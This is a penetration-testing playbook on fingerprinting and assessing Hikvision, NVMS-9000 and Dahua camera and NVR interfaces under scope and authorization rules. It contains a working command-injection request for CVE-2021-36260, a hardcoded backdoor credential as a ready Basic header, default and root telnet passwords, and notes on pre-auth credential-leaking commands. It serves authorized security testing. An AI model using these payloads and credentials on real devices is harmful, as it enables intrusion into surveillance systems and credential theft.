---
type: playbook
title: "NVR IP Camera API — Hikvision ISAPI + NVMS-9000"
tags: [playbook, iot, camera, nvr, hikvision, isapi, nvms-9000, bb-playbook]
category: hunting
status: draft
last_updated: 2026-08-12
---

# Playbook - NVR IP Camera API (Hikvision ISAPI + NVMS-9000)

> **TL;DR**: Embedded NVR/DVR/IP-camera web tiers fail in different ways depending on platform, and the
> failure mode itself is the fingerprint. A `401 Digest` challenge on `/ISAPI/...` means Hikvision; a
> flat `400` on every path with no auth challenge usually means an XML-envelope protocol (NVMS-9000 /
> TVT OEM) whose real unauthenticated attack surface lives on a separate binary control port, not HTTP.
> This playbook gives the correct request formats for Hikvision ISAPI, NVMS-9000, and Dahua, read-only
> pre-auth detection steps, the relevant CVEs (CVE-2021-36260, CVE-2024-14007, CVE-2018-25126), and a
> decision tree for triaging "HTTP 400/401 on every path."

## Scope / When to use

Use this playbook whenever a target exposes NVR/DVR/IP-camera web interfaces and initial HTTP probing
returns non-200 on every guessed path — either a `401` digest challenge, or a flat `400` with no auth
challenge at all. It also applies whenever a device's own JS bundle reveals a `systemType` string (e.g.
`NVMS-9000`) or similar platform fingerprint that isn't immediately recognizable.

**Scope discipline**: All detection here is **GET/read-only** unless explicitly marked otherwise. Any
step that changes device state or executes code is marked **[authorized exploit only]** and must not be
run without explicit in-scope authorization. Anything not yet personally reproduced is marked **[needs
verification]**.

## Phases

### Phase 1: Fingerprint the platform (the single most useful fact)

The different NVR/camera platforms fail differently on unauthenticated probing, and the failure mode IS
the fingerprint:

| Symptom | Likely platform | Why |
|---|---|---|
| `401` + `WWW-Authenticate: Digest realm="..."` on `/ISAPI/...` | **Hikvision** | ISAPI demands digest auth on every path; the challenge itself is the fingerprint |
| **`400` on every HTTP path, no auth challenge** | **NVMS-9000 / TVT OEM** (or other XML-envelope embedded web) | The HTTP server only accepts a specific XML POST envelope; bare `GET /path` is malformed input → 400. The juicy unauth surface is **not on HTTP/80 at all** — it's the proprietary control protocol on a separate TCP port |
| `401` Digest on `/cgi-bin/*.cgi` | **Dahua** | CGI + digest; `magicBox.cgi` is the fingerprint endpoint |

> **Key insight for a vendor's white-label NVR platform**: HTTP 400 on all NVMS-9000 paths is *expected*,
> not a dead end. The web tier wants an XML envelope (Phase 3). The unauthenticated config/credential
> disclosure (CVE-2024-14007 / `queryUserList`) lives on the **binary control port (TCP, e.g. 6036 / 8000
> / 17000), not HTTP**. Port-scan the host before concluding "only exposed."

### Phase 2: Hikvision — ISAPI

ISAPI = "Intelligent Security API", a REST-over-HTTP, XML-bodied protocol on the device's web port
(80/443). Every functional endpoint requires **HTTP Digest auth** (some firmware also allows Basic if
"WEB Authentication" is set to digest/basic).

#### 2.1 Fingerprint (read-only, no creds)

```bash
# A 401 with a Hikvision-style digest realm on an /ISAPI path = Hikvision web server.
curl -sk -i 'https://TARGET/ISAPI/System/deviceInfo'
# Expect: HTTP/1.1 401 Unauthorized
#         WWW-Authenticate: Digest qop="auth", realm="...", nonce="..."
# Server header / realm often leaks model family. deviceInfo body (post-auth) returns
# Serial Number, Firmware Version, Model Name as XML.
```

If you have **valid in-scope creds**, digest auth unlocks the body:

```bash
curl -sk --digest -u 'user:pass' 'https://TARGET/ISAPI/System/deviceInfo' | xmllint --format -
```

#### 2.2 High-value ISAPI endpoints (post-auth, GET = read-only)

| Endpoint | Purpose |
|---|---|
| `/ISAPI/System/deviceInfo` | model, serial, firmware version (best version source for CVE precheck) |
| `/ISAPI/System/deviceInfo/capabilities` | feature/capability map |
| `/ISAPI/Security/users` | user list (privilege levels) |
| `/ISAPI/Security/userCheck` | credential-state probe |
| `/ISAPI/System/Network/interfaces` | network config |
| `/ISAPI/Streaming/channels` | stream/channel inventory |
| `/ISAPI/System/time`, `/ISAPI/System/logServer` | misc config / log targets |

> Note: older firmware accepted a legacy `?auth=<base64(user:pass)>` query param. **[needs verification]**
> on any specific target; treat as a downgrade-auth check only, not a guaranteed bypass.

#### 2.3 CVE-2021-36260 — pre-auth command injection (`/SDK/webLanguage`) **[authorized exploit only]**

- **What**: unauthenticated OS command injection in the web server → RCE **as root**, network-reachable,
  no creds, no interaction. CVSS 3.1 **9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).
- **Affected**: many IPC/PTZ/thermal/NVR lines. Firmware **dated earlier than `210628`** (i.e. before
  2021-06-28 build) is the rough cutoff; example vulnerable build ceilings: IPC_G3 ≤ `5.5.160_210416`,
  IPC_H5 ≤ `5.5.85_201120`, IPC_E7 ≤ `5.5.120_200604`. Confirm exact build via `deviceInfo`.
- **Detection request (the nuclei-templates method)** — this is **active (writes a file)**, so it is
  **[authorized exploit only]**, not read-only recon:

  ```
  PUT /SDK/webLanguage HTTP/1.1
  Host: TARGET
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8

  <?xml version="1.0" encoding="UTF-8"?><language>$(echo RANDTOKEN>webLib/x)</language>
  ```
  then:
  ```
  GET /x HTTP/1.1
  Host: TARGET
  ```
  **Vulnerable** iff the second response body contains `RANDTOKEN` (command substitution executed,
  file written to webroot, then read back). AND-matched.

- **Safer pre-auth triage without writing/executing** (preferred for first-pass recon): use the
  **firmware version from `deviceInfo`** + the affected-version table. If `deviceInfo` is reachable
  enough to read the build (or the build is otherwise known) and it's below the `210628` line, that's a
  high-confidence "likely vulnerable" without firing the payload. Only run the PUT PoC when authorized
  and necessary for proof.

> **Anti-overclaim**: a 401 on `/ISAPI/...` alone proves *Hikvision web server exposed*, nothing more.
> Do **not** report CVE-2021-36260 from exposure-only. Either (a) read the version and cite the
> affected range, marking it **likely vulnerable [needs verification via authorized PoC]**, or (b) run
> the authorized PoC and prove the token echo.

### Phase 3: NVMS-9000 (Shenzhen TVT — and 80+ OEM rebrands)

This is the platform behind many vendors' `systemType="NVMS-9000"` JS string. It powers a huge
white-label DVR/NVR/IPC fleet (TVT and 80+ OEM brands; Avtech and Provision-ISR appear in related
disclosures — exact brand mapping **[needs verification]** per target).

#### 3.1 Why all HTTP paths return 400 — and the correct envelope

The HTTP/80 tier does **not** speak REST. It expects a POST with `Content-Type: text/xml` (some builds
accept `application/x-www-form-urlencoded`) carrying the TVT request envelope. A bare `GET /something`
is unparseable → **400**. The envelope:

```
POST /doLogin HTTP/1.1
Host: TARGET
Authorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=
Content-Type: text/xml
Content-Length: <n>

<?xml version="1.0" encoding="utf-8" ?>
<request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
```

- That `Authorization: Basic` decodes to the **hardcoded vendor credential**
  `admin:{12213BD1-69C7-4862-843D-260500D1DA40}` (CVE-2018-25126). This is a known backdoor-style
  credential used by the web tier itself.
- The envelope attributes (`systemType`, `clientType`, `version`) are mandatory; omit them and you stay
  at 400. **Matching the envelope is the whole trick** — once the body parses, the device responds with
  its own XML.
- **Read-only first-contact (GET-first principle)**: send the `doLogin` envelope above (it's a login
  *probe*, returns session/version info), or a `requestSystemConfig`-style query. Do **not** send any
  `edit*` / config-write call during recon.

#### 3.2 The real unauth disclosure is on the control port, not HTTP — CVE-2024-14007

The serious pre-auth bug is an **authentication bypass in the NVMS-9000 control protocol over a separate
TCP port** (observed: **6036, 8000, 17000, 17001**, others vary by build). A crafted TCP payload (a
"magic GUID" preface + base64-encoded XML, per the TVT/OEM disclosure) invokes privileged query commands
with **no credentials**:

| Command | Discloses |
|---|---|
| `queryUserList` | **all usernames + passwords in cleartext** |
| `queryBasicCfg` | model, serial, software/kernel/hardware version |
| `queryEmailCfg` | SMTP creds |
| `queryFTPCfg` | FTP creds |
| `queryPPPoECfg` | PPPoE creds |

- CVE-2024-14007, CWE-306, CVSS ~8.7. Affects firmware **< 1.3.4**.
- **Recon takeaway**: if HTTP/80 is 400-walling you, **port-scan for the control ports** and fingerprint
  them. Their presence + version `< 1.3.4` = strong "likely vulnerable" signal. Actually issuing
  `queryUserList` returns live cleartext creds → that's an **[authorized exploit only]** step (it
  discloses real PII/credentials), not passive recon. Do it only in-scope and report the read, not the
  reuse.

#### 3.3 CVE-2018-25126 — command injection → root **[authorized exploit only]**

Using the hardcoded web credential, an unauth attacker reaches config endpoints (e.g.
`/editBlackAndWhiteList`) and injects shell metacharacters into XML parameter values → arbitrary command
execution as root. Patched in builds from ~mid-Feb 2018 onward. Treat as authorized-exploit-only; for
recon, the hardcoded-cred + version is the reportable signal.

#### 3.4 Default / known credentials

| Surface | Credential |
|---|---|
| Web/API tier (hardcoded) | `admin:{12213BD1-69C7-4862-843D-260500D1DA40}` |
| Common admin default | `admin` / `123456` (and blank) **[needs verification per device]** |
| Root telnet (legacy TVT) | `root:china123` or `root:1001chin` **[needs verification]** |

### Phase 4: Dahua — HTTP API (cross-reference; frequently co-located with Hikvision)

- **Fingerprint (read-only)**: `GET /cgi-bin/magicBox.cgi?action=getSystemInfo` → `401` digest challenge
  on a `/cgi-bin/*.cgi` path = Dahua. Post-auth it returns model/serial/version.
- **Auth**: HTTP Digest (MD5; `realm`/`nonce`/`qop` in `WWW-Authenticate`). Also a JSON **RPC2** interface
  at `/RPC2_Login` → `/RPC2` (challenge-response session, `session` + `random` nonce). Official RPC2 docs
  are scarce; community clients (e.g. rroller/dahua) implement the flow.
- **Useful CGI (post-auth, GET)**: `magicBox.cgi?action=getDeviceType`, `getSerialNo`,
  `getSoftwareVersion`; `userManager.cgi?action=getUserInfoAll` (user list).
- Historic Dahua auth-bypass/backdoor families (e.g. CVE-2021-33044/33045 login bypass) exist —
  precheck version against advisories **[needs verification per build]**.

### Phase 5: Decision tree — "embedded device returns HTTP 400 (or 401) on every path"

```
START: HTTP probe to web port returns non-200 on all guessed paths
│
├─ 401 + WWW-Authenticate: Digest ?
│   ├─ path is /ISAPI/...      → HIKVISION  → Phase 2 (read deviceInfo version → CVE-2021-36260 affected-range check)
│   ├─ path is /cgi-bin/*.cgi  → DAHUA      → Phase 4 (magicBox.cgi version → advisory precheck)
│   └─ other realm             → generic digest device; pull realm/Server, search "<realm> default cred"
│
└─ 400 (or empty/RST) on bare GETs, NO auth challenge ?
    │  → The server wants a specific request envelope, not REST. Steps:
    │
    ├─ 1. Read the device's OWN JS bundle / web client.
    │      Grep the served JS for: systemType, clientType, the request envelope template,
    │      endpoint names (doLogin / query*Cfg / request*), Content-Type it sets,
    │      and any hardcoded GUID/credential. The client tells you the exact format.
    │      (This is how the systemType string is typically discovered during recon.)
    │
    ├─ 2. Match the platform fingerprint:
    │      systemType="NVMS-9000" / clientType="WEB"  → TVT NVMS-9000 → Phase 3
    │         → POST text/xml envelope to /doLogin with the hardcoded Basic cred.
    │      "magicBox"/Dahua strings                   → Phase 4
    │      ISAPI strings                              → Phase 2
    │
    ├─ 3. Replay the JS's OWN request with mitmproxy/curl (GET-first; login PROBE only, no edit*).
    │      Confirm 400→200 once the envelope + Content-Type + auth header match.
    │
    ├─ 4. PORT-SCAN beyond 80/443. Embedded NVR/DVR keep the real pre-auth surface on
    │      proprietary TCP control ports (NVMS-9000: 6036/8000/17000/17001; others: 34567 "dvrip",
    │      37777 Dahua, 8000 Hikvision SDK). The HTTP 400 wall is often a decoy — the control
    │      port is the prize.
    │
    └─ 5. If still opaque: pull firmware (vendor download / FCC / GPL mirror), unpack the httpd
           binary + webroot, and reverse the dispatch table to recover endpoint names +
           required Content-Type/flags (monolithic-httpd dual-dispatch decode method).
```

#### 5.1 Generic Content-Type / format brute (read-only)
When a device 400s, vary one axis at a time before giving up:
- Method: `GET` → `POST`
- `Content-Type`: `text/xml` → `application/x-www-form-urlencoded` → `application/json` → `application/soap+xml`
- Body: empty → minimal XML envelope copied from the device's JS
- Auth header: none → `Basic` (try hardcoded/default) → `Digest`

A transition from `400` to `200`/`401`/`500` is the signal that you hit the right envelope.

## Decision Points

- **401 + Digest vs flat 400** determines which platform-specific phase to jump to (Hikvision ISAPI,
  Dahua CGI, or NVMS-9000/TVT XML envelope) — see the Phase 5 decision tree.
- **Version-based inference vs firing a PoC**: prefer reading the firmware/build version (`deviceInfo`,
  `queryBasicCfg`, `magicBox.cgi`) and comparing against known-affected ranges before running any
  state-changing or code-execution PoC. Only escalate to an authorized PoC when proof is required and
  in-scope.
- **HTTP 400-wall vs control-port surface**: a flat 400 on HTTP/80 is not "no unauth surface" — it means
  the real pre-auth attack surface likely lives on a separate binary TCP control port. Port-scan before
  concluding a device is only "exposed."
- **Exposure vs vulnerability**: a reachable digest-challenged ISAPI port or a 400-walled NVMS-9000
  web tier is exposure/context, not automatically a finding — see Reporting discipline below.

## Expected Outputs

- Platform identification (Hikvision / NVMS-9000-TVT-OEM / Dahua / other) from failure-mode fingerprint.
- Firmware/build version read from the appropriate version endpoint.
- CVE affected-range determination (CVE-2021-36260, CVE-2024-14007, CVE-2018-25126, or Dahua
  auth-bypass families) marked either "likely vulnerable — needs verification" or "confirmed via
  authorized PoC."
- For NVMS-9000 targets: identification of the correct XML envelope and any reachable control ports
  (6036/8000/17000/17001) for further authorized testing.
- A reportable write-up following the reporting discipline below, or a documented "exposure only, no
  finding" conclusion.

## Reporting discipline (white-label NVR/IoT targets)

- **Exposure ≠ vulnerability.** "NVMS-9000 / Hikvision web interface reachable" is context, not a finding,
  unless paired with a proven pre-auth bug or version-confirmed CVE exposure.
- **Version + CVE precheck is mandatory**: read the build (`deviceInfo` / `queryBasicCfg` /
  `magicBox.cgi`), map it to the affected ranges above, cite the CVE.
- **GET-first**: fingerprint and version-read with read-only requests; mark every state-changing or
  code-exec step **[authorized exploit only]** and run only in-scope.
- **Don't reuse leaked creds.** If `queryUserList` (authorized) returns cleartext creds, report the
  *disclosure*; do not log into other services with them.
- **Three-question filter**: What can an attacker actually get? Is it default-by-design? Strip the theory
  — what concrete impact remains? An open digest-challenged ISAPI port with patched firmware = no finding.
- **No internal IDs in report bodies.**

## Related

- Monolithic-httpd dual-dispatch decode method (for reversing embedded devices whose HTTP dispatch is
  opaque even after envelope-matching).
- Version/CVE pre-check discipline (mandatory before any hands-on firmware/device analysis).
- GET-first / read-only-recon-before-authorized-PoC discipline.

## Sources

- Hikvision ISAPI overview / `/ISAPI/System/deviceInfo` / digest auth — https://medium.com/@MohamedASHRIF-25/bypass-the-web-interface-a-beginners-guide-to-hikvision-isapi-fa880153e237
- Hikvision ISAPI monitoring (endpoint + digest details) — https://hertzbeat.apache.org/docs/help/hikvision_isapi/
- Hikvision ISAPI 401 / WWW-Authenticate behavior — https://tpp.hikvision.com/Wiki/ISAPI/Access%20Control%20on%20Person/GUID-A4CD59AB-948B-4C20-AE5D-E2F44DE3618E.html
- CVE-2021-36260 CISA alert — https://www.cisa.gov/news-events/alerts/2021/09/28/rce-vulnerability-hikvision-cameras-cve-2021-36260
- CVE-2021-36260 Hikvision official advisory (affected firmware) — https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/security-notification-command-injection-vulnerability-in-some-hikvision-products/
- CVE-2021-36260 disclosure (watchfulip) — https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
- CVE-2021-36260 detection request + matcher (nuclei-templates) — https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36260.yaml
- CVE-2021-36260 PoC (affected firmware list) — https://github.com/Aiminsun/CVE-2021-36260
- CVE-2021-36260 SentinelOne vuln DB — https://www.sentinelone.com/vulnerability-database/cve-2021-36260/
- TVT NVMS-9000 hardcoded creds + command injection (VulnCheck, CVE-2018-25126) — https://www.vulncheck.com/advisories/tvt-nvms9000-hardcoded-api-credentials-and-command-injection
- TVT/OEM DVR/NVR/IPC RCE + backdoor + info disclosure PoC (envelope, hardcoded cred, ports) — https://github.com/mcw0/PoC/blob/master/TVT_and_OEM_IPC_NVR_DVR_RCE_Backdoor_and_Information_Disclosure.txt
- TVT/OEM RCE full disclosure (seclists) — https://seclists.org/fulldisclosure/2018/Apr/25
- NVMS-9000 information disclosure (SSD, control-port query commands) — https://ssd-disclosure.com/ssd-advisory-nvms9000-information-disclosure/
- CVE-2024-14007 NVMS-9000 control-protocol auth bypass (GitHub Advisory) — https://github.com/advisories/GHSA-3qf4-5xvv-769w
- CVE-2018-25126 NVMS-9000 (GitHub Advisory) — https://github.com/advisories/GHSA-54fc-5f6v-pcx6
- IoT botnet still exploiting TVT DVRs (active exploitation context) — https://blogs.juniper.net/en-us/threat-research/iot-botnet-exploiting-tvt-shenzhen-dvrs-still-lingers
- Dahua HTTP API / magicBox.cgi / digest — https://ipcamtalk.com/threads/dahua-api.77767/
- Dahua RPC2 + digest client implementation — https://github.com/rroller/dahua/blob/main/custom_components/dahua/client.py
- Dahua HTTP API v2.63 reference — https://pdfcoffee.com/dahua-http-api-v263-2-pdf-free.html
